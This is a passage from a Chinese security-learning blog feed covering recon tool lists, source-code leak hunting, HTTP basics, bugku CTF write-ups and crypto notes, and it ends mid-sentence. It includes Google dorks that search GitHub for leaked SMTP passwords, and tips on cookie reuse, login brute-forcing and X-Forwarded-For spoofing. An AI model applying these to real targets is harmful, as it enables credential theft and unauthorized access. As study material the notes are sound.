href="https://github.com/ScriptKid-Beta/Unexpected_information">https://github.com/ScriptKid-Beta/Unexpected_information</a><br>用来标记请求包中的一些敏感信息、JS接口和一些特殊字段，防止我们疏忽了一些数据包，使用它可能会有意外的收获信息。<br>HaE：<br><a href="https://github.com/gh0stkey/HaE">https://github.com/gh0stkey/HaE</a><br><a href="https://raw.githubusercontent.com/gh0stkey/HaE/gh-pages/Config.yml">https://raw.githubusercontent.com/gh0stkey/HaE/gh-pages/Config.yml</a><br>基于BurpSuite插件JavaAPI开发的请求高亮标记与信息提取的辅助型插件。该插件可以通过自定义正则的方式匹配响应报文或请求报文，可以自行决定符合该自定义正则匹配的相应请求是否需要高亮标记、信息提取。</p></blockquote><h2 id="前端架构-自动化项目分析"><a href="#前端架构-自动化项目分析" class="headerlink" title="前端架构-自动化项目分析"></a>前端架构-自动化项目分析</h2><p>浏览器自动化抓取插件。</p><p><a href="https://github.com/Threezh1/JSFinder">Jsfinder</a>-从表现中JS中提取URL或者敏感数据</p><blockquote><p>一款用作快速在网站的js文件中提取URL，子域名的工具<br>老牌的前端自动化项目分析，功能比较差。</p></blockquote><p><a href="https://github.com/pingc0y/URLFinder">URLFinder</a>-从表现中JS中提取URL或者敏感数据</p><blockquote><p>一款用于快速提取检测页面中JS与URL的工具。<br>功能类似于JSFinder，但JSFinder好久没更新了。<br>推荐，可以直接使用(.exe)</p></blockquote><p><a href="https://github.com/p1g3/JSINFO-SCAN">JSINFO-SCAN</a>-从表现中JS中提取URL或者敏感数据</p><blockquote><p>递归爬取域名(netloc/domain)，以及递归从JS中获取信息的工具</p></blockquote><p><a href="https://github.com/momosecurity/FindSomething">FindSomething</a>-从表现中JS中提取URL或者敏感数据</p><blockquote><p>该工具是用于快速在网页的html源码或js代码中提取一些有趣的信息的浏览器插件，<br>包括请求的资源、接口的url，请求的ip和域名，泄漏的证件号、手机号、邮箱等信息。</p></blockquote><p><a href="https://github.com/ffuf/ffuf">ffuf-FUZZ</a>-爆破找到更多的js文件分析更多的信息</p><blockquote><p>功能强大的模糊化工具，用它来FUZZ模糊化js文件。</p></blockquote><p><a href="https://github.com/rtcatc/Packer-Fuzzer">Packer-Fuzzer</a>-针对JS框架开发打包器Webpack检测</p><blockquote><p>一款针对Webpack等前端打包工具所构造的网站进行快速、高效安全检测的扫描工具</p></blockquote><p><a href="https://wordlists.assetnote.io/">更多字典下载站点</a></p><!-- 实验站点：http://mail11.030book.com:8110/ -->]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC学习2023版-0016</title>
      <link href="/2023/04/01/SEC-Study-0016/"/>
      <url>/2023/04/01/SEC-Study-0016/</url>
      
        <content type="html"><![CDATA[<p>信息打点</p><span id="more"></span><h1 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h1><table><thead><tr><th>标签</th><th>名称</th><th>地址</th></tr></thead><tbody><tr><td>指纹识别</td><td>在线cms指纹识别</td><td><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></td></tr><tr><td>指纹识别</td><td>Wappalyzer</td><td><a href="https://github.com/AliasIO/wappalyzer">https://github.com/AliasIO/wappalyzer</a></td></tr><tr><td>指纹识别</td><td>TideFinger潮汐</td><td><a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a></td></tr><tr><td>指纹识别</td><td>云悉指纹</td><td><a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></td></tr><tr><td>指纹识别</td><td>WhatWeb</td><td><a href="https://github.com/urbanadventurer/WhatWeb">https://github.com/urbanadventurer/WhatWeb</a></td></tr><tr><td>指纹识别</td><td>数字观星Finger-P</td><td><a href="https://fp.shuziguanxing.com/#/">https://fp.shuziguanxing.com/#/</a></td></tr></tbody></table><h1 id="后端-开源-指纹识别-源码下载-识别得出来"><a href="#后端-开源-指纹识别-源码下载-识别得出来" class="headerlink" title="后端-开源-指纹识别-源码下载(识别得出来)"></a>后端-开源-指纹识别-源码下载(识别得出来)</h1><p>CMS识别，到官网或者其他地方下载源码，再去挖掘它的漏洞，最终挖掘网站的CMS漏洞。</p><h1 id="后端-闭源-配置不当-源码泄漏-识别不出来钻管理员习惯的空子"><a href="#后端-闭源-配置不当-源码泄漏-识别不出来钻管理员习惯的空子" class="headerlink" title="后端-闭源-配置不当-源码泄漏(识别不出来钻管理员习惯的空子)"></a>后端-闭源-配置不当-源码泄漏(识别不出来钻管理员习惯的空子)</h1><pre><code>常见源码泄露参考：https://www.secpulse.com/archives/124398.html备份：敏感目录文件扫描CVS：https://github.com/kost/dvcs-ripperGIT：https://github.com/lijiejie/GitHackSVN：https://github.com/callmefeifei/SvnHackDS_Store：https://github.com/lijiejie/ds_store_exp</code></pre><p>源码泄漏原因：<br>1、从源码本身的特性入口<br>2、从管理员不好的习惯入口<br>3、从管理员不好的配置入口<br>4、从管理员不好的意识入口<br>5、从管理员资源信息搜集入口</p><p><strong>源码泄漏集合</strong> ：<br>composer.json<br>git源码泄露<br>svn源码泄露<br>hg源码泄漏<br>网站备份压缩文件<br>WEB-INF/web.xml 泄露<br>DS_Store 文件泄露<br>SWP 文件泄露<br>CVS泄露<br>Bzr泄露<br>GitHub源码泄漏</p><h1 id="后端-方向-资源GITHUB-源码泄漏-识别不到"><a href="#后端-方向-资源GITHUB-源码泄漏-识别不到" class="headerlink" title="后端-方向-资源GITHUB-源码泄漏(识别不到)"></a>后端-方向-资源GITHUB-源码泄漏(识别不到)</h1><p>解决1：识别出大致信息却无下载资源<br>解决2：未识别出信息使用码云资源获取<br>解决3：其他行业开发使用对口资源站获取-&gt;和传统常规源码使用面不一样，收集也不一样。</p><h2 id="程序员交流网站："><a href="#程序员交流网站：" class="headerlink" title="程序员交流网站："></a>程序员交流网站：</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://gitee.com/</span><br><span class="line">https://www.oschina.net/</span><br><span class="line">https://github.com/</span><br><span class="line">https://www.huzhan.com/</span><br></pre></td></tr></table></figure><p>通过程序员的交流网站找到开发作者，找到目标源码。<!-- 某些灰黑色产业的源码需要你自己去寻找。 --></p><p><strong>源码识别</strong> :<br>关键文件识别：网站数据包抓取，识别网站CMS类型。选择脚本文件放到开源代码平台上去搜索，找到对应的站点，找到对应的CMS。要看清楚域名。<br>关键字识别：文件当中的某些关键字，类似于“qq.com”</p><!-- app网站方面涉及黑产，app源码分析，app的源码可以在灰黑产网站找到按照行业去找源码，如果是擦边球的就是去擦边球的平台找源码(只不过是小众型黑产) --><h2 id="GITHUB-Google资源搜索："><a href="#GITHUB-Google资源搜索：" class="headerlink" title="GITHUB/Google资源搜索："></a>GITHUB/Google资源搜索：</h2><p>这是Github搜索关键词。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">in</span>:name <span class="built_in">test</span>               <span class="comment">#仓库标题搜索含有关键字 </span></span><br><span class="line"><span class="keyword">in</span>:descripton <span class="built_in">test</span>         <span class="comment">#仓库描述搜索含有关键字 </span></span><br><span class="line"><span class="keyword">in</span>:readme <span class="built_in">test</span>             <span class="comment">#Readme文件搜素含有关键字 </span></span><br><span class="line">stars:&gt;3000 <span class="built_in">test</span>           <span class="comment">#stars数量大于3000的搜索关键字 </span></span><br><span class="line">stars:1000..3000 <span class="built_in">test</span>      <span class="comment">#stars数量大于1000小于3000的搜索关键字 forks:&gt;1000 test           #forks数量大于1000的搜索关键字 </span></span><br><span class="line">forks:1000..3000 <span class="built_in">test</span>      <span class="comment">#forks数量大于1000小于3000的搜索关键字 size:&gt;=5000 test           #指定仓库大于5000k(5M)的搜索关键字 pushed:&gt;2019-02-12 test    #发布时间大于2019-02-12的搜索关键字 created:&gt;2019-02-12 test   #创建时间大于2019-02-12的搜索关键字 user:test                  #用户名搜素 </span></span><br><span class="line">license:apache-2.0 <span class="built_in">test</span>    <span class="comment">#明确仓库的 LICENSE 搜索关键字 language:java test         #在java语言的代码中搜索关键字 </span></span><br><span class="line">user:<span class="built_in">test</span> <span class="keyword">in</span>:name <span class="built_in">test</span>     <span class="comment">#组合搜索,用户名test的标题含有test的</span></span><br></pre></td></tr></table></figure><p>关键字配合谷歌搜索：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">site:Github.com smtp   </span><br><span class="line">site:Github.com smtp @qq.com   </span><br><span class="line">site:Github.com smtp @126.com   </span><br><span class="line">site:Github.com smtp @163.com   </span><br><span class="line">site:Github.com smtp @sina.com.cn </span><br><span class="line">site:Github.com smtp password </span><br><span class="line">site:Github.com String password smtp</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC学习2023版-0015</title>
      <link href="/2023/04/01/SEC-Study-0015/"/>
      <url>/2023/04/01/SEC-Study-0015/</url>
      
        <content type="html"><![CDATA[<p>信息收集</p><span id="more"></span><h1 id="常见信息查询网站"><a href="#常见信息查询网站" class="headerlink" title="常见信息查询网站"></a>常见信息查询网站</h1><p>信息收集，“★★”为常用的。</p><table><thead><tr><th>标签</th><th>名称</th><th>地址</th></tr></thead><tbody><tr><td>企业信息</td><td>天眼查</td><td><a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></td></tr><tr><td>企业信息</td><td>小蓝本★★</td><td><a href="https://www.xiaolanben.com/">https://www.xiaolanben.com/</a></td></tr><tr><td>企业信息</td><td>爱企查★★</td><td><a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></td></tr><tr><td>企业信息</td><td>企查查</td><td><a href="https://www.qcc.com/">https://www.qcc.com/</a></td></tr><tr><td>企业信息</td><td>国外企查</td><td><a href="https://opencorporates.com/">https://opencorporates.com/</a></td></tr><tr><td>企业信息</td><td>启信宝</td><td><a href="https://www.qixin.com/">https://www.qixin.com/</a></td></tr><tr><td>备案信息</td><td>备案信息查询</td><td><a href="http://www.beianx.cn/">http://www.beianx.cn/</a></td></tr><tr><td>备案信息</td><td>备案管理系统</td><td><a href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a></td></tr><tr><td>公众号信息</td><td>搜狗微信搜索</td><td><a href="https://weixin.sogou.com/">https://weixin.sogou.com/</a></td></tr><tr><td>注册域名</td><td>域名注册查询</td><td><a href="https://buy.cloud.tencent.com/domain">https://buy.cloud.tencent.com/domain</a></td></tr><tr><td>IP反查</td><td>IP反查域名</td><td><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></td></tr><tr><td>IP反查</td><td>IP反查域名</td><td><a href="http://dns.bugscaner.com/">http://dns.bugscaner.com/</a></td></tr><tr><td></td><td></td><td></td></tr><tr><td>标签</td><td>名称</td><td>地址</td></tr><tr><td>——–</td><td>———————-</td><td>————————————–</td></tr><tr><td>DNS数据</td><td>dnsdumpster★★</td><td><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></td></tr><tr><td>证书查询</td><td>Certificate Search</td><td><a href="https://crt.sh/">https://crt.sh/</a></td></tr><tr><td>网络空间</td><td>FOFA★★</td><td><a href="https://fofa.info/">https://fofa.info/</a></td></tr><tr><td>网络空间</td><td>全球鹰★★</td><td><a href="http://hunter.qianxin.com/">http://hunter.qianxin.com/</a></td></tr><tr><td>网络空间</td><td>360★★</td><td><a href="https://quake.360.cn/quake/#/index">https://quake.360.cn/quake/#/index</a></td></tr><tr><td>威胁情报</td><td>微步在线★★</td><td>情报社区    <a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></td></tr><tr><td>威胁情报</td><td>奇安信 ★★</td><td>威胁情报中心    <a href="https://ti.qianxin.com/">https://ti.qianxin.com/</a></td></tr><tr><td>威胁情报</td><td>360 威胁情报中心★★</td><td><a href="https://ti.360.cn/#/homepage">https://ti.360.cn/#/homepage</a></td></tr><tr><td>枚举解析</td><td>在线子域名查询</td><td><a href="http://tools.bugscaner.com/subdomain/">http://tools.bugscaner.com/subdomain/</a></td></tr><tr><td>枚举解析</td><td>DNSGrep子域名查询★★</td><td><a href="https://www.dnsgrep.cn/subdomain">https://www.dnsgrep.cn/subdomain</a></td></tr><tr><td>枚举解析</td><td>工具强大的子域名收集器</td><td><a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></td></tr></tbody></table><table><thead><tr><th>标签</th><th>名称</th><th>地址</th></tr></thead><tbody><tr><td>指纹识别</td><td>在线cms指纹识别</td><td><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></td></tr><tr><td>指纹识别</td><td>Wappalyzer</td><td><a href="https://github.com/AliasIO/wappalyzer">https://github.com/AliasIO/wappalyzer</a></td></tr><tr><td>指纹识别</td><td>TideFinger潮汐★</td><td><a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a></td></tr><tr><td>指纹识别</td><td>云悉指纹★</td><td><a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></td></tr><tr><td>指纹识别</td><td>WhatWeb★★</td><td><a href="https://github.com/urbanadventurer/WhatWeb">https://github.com/urbanadventurer/WhatWeb</a></td></tr><tr><td>指纹识别</td><td>数字观星Finger</td><td>-P    <a href="https://fp.shuziguanxing.com/#/">https://fp.shuziguanxing.com/#/</a></td></tr></tbody></table><table><thead><tr><th>标签</th><th>名称</th><th>地址</th></tr></thead><tbody><tr><td>网络空间</td><td>钟馗之眼★★</td><td><a href="https://www.zoomeye.org/?R1nG">https://www.zoomeye.org/?R1nG</a></td></tr><tr><td>网络空间</td><td>零零信安★★</td><td><a href="https://0.zone/">https://0.zone/</a></td></tr><tr><td>网络空间</td><td>Shodan ★★</td><td><a href="https://www.shodan.io/">https://www.shodan.io/</a></td></tr><tr><td>网络空间</td><td>Censys</td><td><a href="https://censys.io/">https://censys.io/</a></td></tr><tr><td>网络空间</td><td>ONYPHE</td><td><a href="https://www.onyphe.io/">https://www.onyphe.io/</a></td></tr><tr><td>网络空间</td><td>Full</td><td>Hunt    <a href="https://fullhunt.io/">https://fullhunt.io/</a></td></tr><tr><td>网络空间</td><td>Soall</td><td>Search Engine    <a href="https://soall.org/">https://soall.org/</a></td></tr><tr><td>网络空间</td><td>Netlas</td><td><a href="https://app.netlas.io/responses/">https://app.netlas.io/responses/</a></td></tr><tr><td>网络空间</td><td>Leakix</td><td><a href="https://leakix.net/">https://leakix.net/</a></td></tr><tr><td>网络空间</td><td>Dork</td><td>Search    <a href="https://dorksearch.com/">https://dorksearch.com/</a></td></tr><tr><td>威胁情报</td><td>Virus</td><td>Total在线查杀平台    <a href="https://www.virustotal.com/gui/">https://www.virustotal.com/gui/</a></td></tr><tr><td>威胁情报</td><td>Venus</td><td>Eye 威胁情报中心    <a href="https://www.venuseye.com.cn/">https://www.venuseye.com.cn/</a></td></tr><tr><td>威胁情报</td><td>绿盟科技 威胁情报云</td><td><a href="https://ti.nsfocus.com/">https://ti.nsfocus.com/</a></td></tr><tr><td>威胁情报</td><td>IBM 情报中心</td><td><a href="https://exchange.xforce.ibmcloud.com/">https://exchange.xforce.ibmcloud.com/</a></td></tr><tr><td>威胁情报</td><td>天际友盟安全智能平台</td><td><a href="https://redqueen.tj-un.com/IntelHome.html">https://redqueen.tj-un.com/IntelHome.html</a></td></tr><tr><td>威胁情报</td><td>华为安全中心平台</td><td><a href="https://isecurity.huawei.com/sec/web/intelligencePortal.do">https://isecurity.huawei.com/sec/web/intelligencePortal.do</a></td></tr><tr><td>威胁情报</td><td>安恒威胁情报中心</td><td><a href="https://ti.dbappsecurity.com.cn/">https://ti.dbappsecurity.com.cn/</a></td></tr><tr><td>威胁情报</td><td>AlienVault</td><td><a href="https://otx.alienvault.com/">https://otx.alienvault.com/</a></td></tr><tr><td>威胁情报</td><td>深信服</td><td><a href="https://sec.sangfor.com.cn/analysis-platform">https://sec.sangfor.com.cn/analysis-platform</a></td></tr><tr><td>威胁情报</td><td>丁爸情报分析师的工具箱</td><td><a href="http://dingba.top/">http://dingba.top/</a></td></tr><tr><td>威胁情报</td><td>听风者情报源</td><td>start.me    <a href="https://start.me/p/X20Apn">https://start.me/p/X20Apn</a></td></tr><tr><td>威胁情报</td><td>GreyNoise Visualizer</td><td><a href="https://viz.greynoise.io/">https://viz.greynoise.io/</a></td></tr><tr><td>威胁情报</td><td>URLhaus 数据库</td><td><a href="https://urlhaus.abuse.ch/browse/">https://urlhaus.abuse.ch/browse/</a></td></tr><tr><td>威胁情报</td><td>Pithus</td><td><a href="https://beta.pithus.org/">https://beta.pithus.org/</a></td></tr></tbody></table><h1 id="业务资产："><a href="#业务资产：" class="headerlink" title="业务资产："></a>业务资产：</h1><p>1、WEB应用<br>2、APP应用<br>3、PC端应用<br>4、小程序应用<br>5、微信公众号<br>6、其他产品等</p><h1 id="WEB单域名："><a href="#WEB单域名：" class="headerlink" title="WEB单域名："></a>WEB单域名：</h1><p>1、备案信息<br>2、企业产权<br>3、注册域名<br>4、反查解析</p><h1 id="WEB子域名："><a href="#WEB子域名：" class="headerlink" title="WEB子域名："></a>WEB子域名：</h1><p>1、DNS数据(DNS解析经常使用公用DNS，大公司一般使用自己的DNS，自己的DNS比较安全。)<br>2、证书查询(https)<br>3、网络空间(fofo,全球鹰,360quake)<br>4、威胁情报<br>5、枚举解析(字典批量爆破★★)</p><p>涉及工具：OneForAll(DNS数据 证书查询 枚举解析)</p><h1 id="Web架构资产："><a href="#Web架构资产：" class="headerlink" title="Web架构资产："></a>Web架构资产：</h1><p>1、程序语言<br>2、框架源码<br>3、搭建平台(免费和付费的区别-&lt;之前说过&gt;)<br>4、数据库类<br>5、操作系统</p><blockquote><p>更多详情：<a href="https://forum.ywhack.com/bountytips.php?tools">棱角社区</a><br>安全测试：<br>看网站CMS框架是什么，再查它历史漏洞，直接使用漏洞爆它。<br>有些指纹识别有误报。<br>插件：webextension<br>支持国内源码比较少，国外可能多些</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
            <tag> sec重点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC学习2023版-0014</title>
      <link href="/2023/03/31/SEC-Study-0014/"/>
      <url>/2023/03/31/SEC-Study-0014/</url>
      
        <content type="html"><![CDATA[<p>基础</p><span id="more"></span><h1 id="参照图"><a href="#参照图" class="headerlink" title="参照图"></a>参照图</h1><p><img src="c1.png" alt="服务器中间件"><br>Request：<br><img src="c2.png" alt="Request"><br>Response：<br><img src="c3.png" alt="Response"><br><img src="c4.png" alt="get请求"><br><img src="c5.png" alt="post请求"></p><h1 id="数据-方法-amp-头部-amp-状态码"><a href="#数据-方法-amp-头部-amp-状态码" class="headerlink" title="数据-方法&amp;头部&amp;状态码"></a>数据-方法&amp;头部&amp;状态码</h1><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>1、常规请求-Get<br>2、用户登录-Post</p><p>所以请求方法：</p><pre><code>•get：      向特定资源发出请求（请求指定页面信息，并返回实体主体）；•post：     向指定资源提交数据进行处理请求（提交表单、上传文件），又可能导致新的资源的建立或原有资源的修改；•head：     与服务器索与get请求一致的相应，响应体不会返回，获取包含在小消息头中的原信息（与get请求类似，返回的响应中没有具体内容，用于获取报头）；•put：      向指定资源位置上上传其最新内容（从客户端向服务器传送的数据取代指定文档的内容），与post的区别是put为幂等，post为非幂等；•trace：    回显服务器收到的请求，用于测试和诊断。trace是http8种请求方式之中最安全的l•delete：   请求服务器删除request-URL所标示的资源*（请求服务器删除页面）•option：   返回服务器针对特定资源所支持的HTML请求方法 或web服务器发送*测试服务器功能（允许客户 端查看服务器性能）；•connect ： HTTP/1.1协议中能够将连接改为管道方式的代理服务器</code></pre><p>演示：<br>1、UA头-设备平台<br>同类型同平台数据包务必保持一致，否则可能出现打不开的情况。=&gt;UA一致性<br>2、Cookie-身份替换<br>拿到cookie身份认证，可以登录别人的账号。</p><p><strong>安全测试时</strong> ：<br>电脑访问APP和模拟器访问APP数据包有所不同，必须要符合特定的规则和语法才能访问到正确的数据包.<br>如果测试场景是后台，保持登录状态才能测试。登不进去就没法测了。</p><h2 id="Response状态码"><a href="#Response状态码" class="headerlink" title="Response状态码"></a>Response状态码</h2><pre><code>1、数据是否正常2、文件是否存在3、地址自动跳转4、服务提供错误</code></pre><p>注：容错处理识别</p><p><strong>请求的状态</strong> ：</p><pre><code>•1xx:指示信息—表示请求已接收，继续处理。•2xx:成功—表示请求已经被成功接收、理解、接受。•3xx:重定向—要完成请求必须进行更进一步的操作。 •4xx:客户端错误—请求有语法错误或请求无法实现。•5xx:服务器端错误—服务器未能实现合法的请求。•200 OK：客户端请求成功•301 redirect：页面永久性移走，服务器进行重定向跳转；•302 redirect：页面暂时性移走，服务器进行重定向跳转，具有被劫持的安全风险；•400 BadRequest：由于客户端请求有语法错误，不能被服务器所理解；•401 Unauthonzed：请求未经授权。•403 Forbidden：服务器收到请求，但是拒绝提供服务。•404 NotFound：请求的资源不存在，例如，输入了错误的URL；•500 InternalServerError：服务器发生不可预期的错误，无法完成客户端的请求；•503 ServiceUnavailable：服务器当前不能够处理客户端的请求</code></pre><p>文件判断方法：</p><pre><code>200     文件存在404     文件不存在403     文件夹存在500     可能存在或不存在 -&gt; 可能是服务器有问题3xx     可能存在或不存在 -&gt; 重定向，访问时自动跳转(容错处理)</code></pre><h1 id="案例-文件探针-amp-登录爆破"><a href="#案例-文件探针-amp-登录爆破" class="headerlink" title="案例-文件探针&amp;登录爆破"></a>案例-文件探针&amp;登录爆破</h1><p>实验：</p><p>1、页面正常访问<br>2、网站文件探针<br>3、后台登录爆破</p><blockquote><p><strong>思考</strong> ：</p><ol><li>如果没有类似于《御剑后台扫描》的工具，可以使用Burp+字典的形式进行域名爆破.<br>说白了，就是Burp狙击手模式，不断瞄准域名的位置进行替换，看返回的状态码确定指定的网站目录或者文件是否存在。</li><li>狙击手模式：如果需要传入默认经过md5加密的密码，可以使用PayloadProcessing(有效负载处理)来设置。<br>数据包经常使用(比较好玩)</li></ol></blockquote><h1 id="工具-Postman自构造使用"><a href="#工具-Postman自构造使用" class="headerlink" title="工具-Postman自构造使用"></a>工具-Postman自构造使用</h1><p><a href="https://zhuanlan.zhihu.com/p/551703621">Postman</a>：自编写和构造数据包的工具。</p><p>其实和bp差不多，就是Postman的UI好看点。相对于bp抓包功能略全些。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">网站测不出来：</span><br><span class="line">形如</span><br><span class="line">sqlmap -i http://xxx.xxx.com    =&gt;它会按照sqlmap默认的文件头去访问网址。</span><br></pre></td></tr></table></figure><h1 id="ChatGPT"><a href="#ChatGPT" class="headerlink" title="ChatGPT"></a>ChatGPT</h1><h2 id="ChatGPT是什么"><a href="#ChatGPT是什么" class="headerlink" title="ChatGPT是什么?"></a>ChatGPT是什么?</h2><p>ChatGPT–可能很多人被这个缩写的名字搞糊涂了，第一眼无法看出到底什么意思，GPT 的英文原文是 Generative Pre-training Transformer（预训练生成模型），业界有人将 ChatGPT 概括为聊天机器人+搜索工具+文本创造工具的组合，或者简单理解它是一个生成式 AI（内容生成器）。</p><h2 id="ChatGPT能做什么？"><a href="#ChatGPT能做什么？" class="headerlink" title="ChatGPT能做什么？"></a>ChatGPT能做什么？</h2><p>它的主要功能是协助回答问题、提供信息和生成有关历史、科学、地理等各种主题的信息，这些信息仅限于它所接受的训练，但其知识在不断扩展。</p><h2 id="ChatGPT牛在哪里？"><a href="#ChatGPT牛在哪里？" class="headerlink" title="ChatGPT牛在哪里？"></a>ChatGPT牛在哪里？</h2><ol><li>它是个通用的模型，只要提示词引导，就能快速适应不同领域。</li><li>它能理解你的问题，只要给的引导越多，它就能给出你想要的答案。</li></ol><p>安全行业影响：</p><ol><li>整合多种恶意软件</li><li>提升漏洞发现能力</li><li>给新手攻击者赋能</li><li>便于社会工程学攻击</li><li>快速筛选和锁定目标</li><li>模拟网络防御攻击技术</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-web-004</title>
      <link href="/2023/03/30/CTF-web-004/"/>
      <url>/2023/03/30/CTF-web-004/</url>
      
        <content type="html"><![CDATA[<p>web日常训练，题目源于bugku</p><span id="more"></span><h1 id="bp"><a href="#bp" class="headerlink" title="bp"></a>bp</h1><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p><img src="c1.jpg" alt="题目"><br><img src="c.jpg" alt="题目"></p><p>标题提示：使用burp和top 1000爆破</p><p>使用蓝BP抓包：</p><p>先将包转发到重发器：<br><img src="c2.jpg" alt="重发器收到的结果"><br>将包配置到狙击手：<br><img src="c4.jpg" alt="测试器的结果"><br><img src="c5.jpg" alt="测试器的结果"><br>爆破结果：<br><img src="c3.jpg" alt="重发器收到的结果"><br><strong>难道是哪里思路有问题？</strong><br>思路开叉……！-&gt;排除掉所有带js的包试试：<br>这里使用橙BP：<br><img src="c6.jpg" alt="测试器的结果"><br><img src="c7.jpg" alt="测试器的结果"><br><img src="c8.jpg" alt="测试器的结果"><br>得到flag<br><img src="c9.jpg" alt="flag"><br><img src="c10.jpg" alt="flag"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>根据相同的包，在burp上面配置规则过滤掉。</p><p>知识点在于：配置数据包过滤规则。</p><h1 id="本地管理员"><a href="#本地管理员" class="headerlink" title="本地管理员"></a>本地管理员</h1><h2 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h2><p>得到题目<br><img src="d0.jpg" alt="得题"><br><img src="d1.jpg" alt="题目"></p><p>思考方向：</p><ul><li>对登录窗口实行爆破</li><li>对登录窗口的一串n进行解密</li><li>XFF伪造攻击<br><img src="d5.jpg" alt="1"><br>使用admin和test123登录，抓包并且修改xff。<br><img src="d2.jpg" alt="1"><br><img src="d3.jpg" alt="1"><br><img src="d4.jpg" alt="1"></li></ul><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>XFF伪造欺骗：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure><p>主要功能：伪造IP地址来源。</p><h1 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h1><h2 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h2><p>得到题目：<br><img src="e1.jpg" alt="题目"><br><img src="e2.jpg" alt="场景"><br>分析下函数：<br><img src="e3.jpg" alt="函数"><br>具体操作都是针对flag文件的<br>思路：显示flag文件的内容。<br>下面是列表显示<br><img src="e4.jpg" alt="尝试"><br>flag提交<br><img src="e5.jpg" alt="得到flag"></p><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>web的十大漏洞之一：文件包含。</p>]]></content>
      
      
      <categories>
          
          <category> CTF赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-Study-0013</title>
      <link href="/2023/03/30/SEC-Study-0013/"/>
      <url>/2023/03/30/SEC-Study-0013/</url>
      
        <content type="html"><![CDATA[<p>基础加解密</p><span id="more"></span><h1 id="算法加解密"><a href="#算法加解密" class="headerlink" title="算法加解密"></a>算法加解密</h1><p>劝你：数学逻辑强的话学算法简单……</p><p>安全测试中：</p><p>密文-有源码直接看源码分析算法（后端必须要有源码才能彻底知道）<br>密文-没有源码<br>1、猜识别<br>2、看前端JS（看加密逻辑是不是在前端）</p><h2 id="算法加密-概念-amp-分类-amp-类型"><a href="#算法加密-概念-amp-分类-amp-类型" class="headerlink" title="算法加密-概念&amp;分类&amp;类型"></a>算法加密-概念&amp;分类&amp;类型</h2><blockquote><ol><li><p>单向散列加密 -MD5<br>单向散列加密算法的优点有(以MD5为例)：<br>方便存储，损耗低：加密 /加密对于性能的损耗微乎其微。<br>单向散列加密的缺点就是存在暴力破解的可能性，最好通过加盐值的方式提高安全性，此外可能存在散列冲突。我们都知道MD5加密也是可以破解的。<br>常见的单向散列加密算法有：<br>MD5 SHA MAC CRC</p></li><li><p>对称加密 -AES<br>对称加密优点是算法公开、计算量小、加密速度快、加密效率高。<br>缺点是发送方和接收方必须商定好密钥，然后使双方都能保存好密钥，密钥管理成为双方的负担。<br>常见的对称加密算法有：<br>DES AES RC4</p></li><li><p>非对称加密 -RSA<br>非对称加密的优点是与对称加密相比，安全性更好，加解密需要不同的密钥，公钥和私钥都可进行相互的加解密。<br>缺点是加密和解密花费时间长、速度慢，只适合对少量数据进行加密。<br>RSA分为公钥加密和私钥加密。<br>常见的非对称加密算法：<br>RSA RSA2 PKCS</p></li></ol></blockquote><h2 id="识别特征-amp-解密条件"><a href="#识别特征-amp-解密条件" class="headerlink" title="识别特征&amp;解密条件"></a>识别特征&amp;解密条件</h2><p>MD5密文特点：</p><blockquote><p>1、由数字“0-9”和字母“a-f”所组成的字符串<br>2、固定的位数 16 和 